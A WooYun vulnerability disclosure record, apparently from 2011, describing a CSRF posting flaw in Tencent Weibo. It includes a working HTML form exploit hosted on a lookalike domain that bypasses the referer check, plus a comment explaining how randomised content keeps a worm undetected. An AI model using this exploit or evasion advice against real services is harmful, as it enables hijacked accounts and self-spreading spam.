{"id": 22663, "wybug_id": "wooyun-2011-02157", "wybug_title": "腾讯微博一处referer限制不严的csrf发帖漏洞", "wybug_corp": "腾讯", "wybug_author": "呆子不开口", "wybug_date": "2011-05-20 16:15", "wybug_open_date": "2011-06-19 21:00", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用技巧", "蠕虫", "类型应用", "漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-05-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-06-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-06-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-06-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-06-19：\t细节向公众公开  简要描述： 腾讯微博一处csrf发帖漏洞，referer限制不严，可以传播蠕虫 详细说明：  腾讯微博一处csrf发帖漏洞，referer限制不严，可以传播蠕虫   漏洞证明：  一键转发微博的地方，若来源页为http://v.t.qq.com.fffffffff.me/myform.php，则绕过referer过滤\n<form action=\"http://v.t.qq.com/cgi-bin/share\" method=\"post\" name=\"myform\" id=\"myform\">  <input type=\"hidden\" name=\"content\" value=\"这个姑娘的胸好美啊 http://lvwei.me <?php echo rand(1,1000000);?>\"/>  <input type=\"hidden\" name=\"url\" value=\"http%3A%2F%2Fipad.qq.com%2Ftopic%2Findex.htm\"/>  <input type=\"hidden\" name=\"appkey\" value=\"9172f1efc7614f399196804ae5f5e31b\"/>  <input type=\"hidden\" name=\"source\" value=\"\"/>  <input type=\"hidden\" name=\"site\" value=\"ipad.qq.com\"/>  <input type=\"hidden\" name=\"pic\" value=\"\"/>  <input type=\"hidden\" name=\"flag\" value=\"0\"/></form>\n   修复方案：  referer过滤严格点   版权声明：转载请注明来源 呆子不开口@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2011-05-22 18:54 厂商回复： 添加对漏洞的补充说明以及做出评价的理由 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-05-20 18:22 |    \t\tpg5yl8 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:12        | 我神马都不会 但我常常被人日 这是为神马呢)\t\t \n  坐等···    \n     2011-05-20 20:27 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这不就是蠕虫么    \n     2011-09-06 17:31 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  这个姑娘的胸好美啊    \n     2013-01-24 03:35 |    \t\tSpy198x \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 撸得一手好扳.)\t\t \n  这个姑娘的胸毛好美啊    \n     2013-04-09 12:10 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  @xsser 为什么要<?php echo rand(1,1000000);?>    \n     2013-04-09 15:42 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:25        | 求各种兼职)\t\t \n  @Passer_by 首先我自己测试的时候，微博是不让短时间内发同样的内容的。当大量用户都这么发时，可以防止对方监测出这种蠕虫的行为。再有可以给对方的批量清理带来麻烦，增加你蠕虫的存活时间    \n     2013-04-09 17:36 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  @呆子不开口 soga。。好人一生平安    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}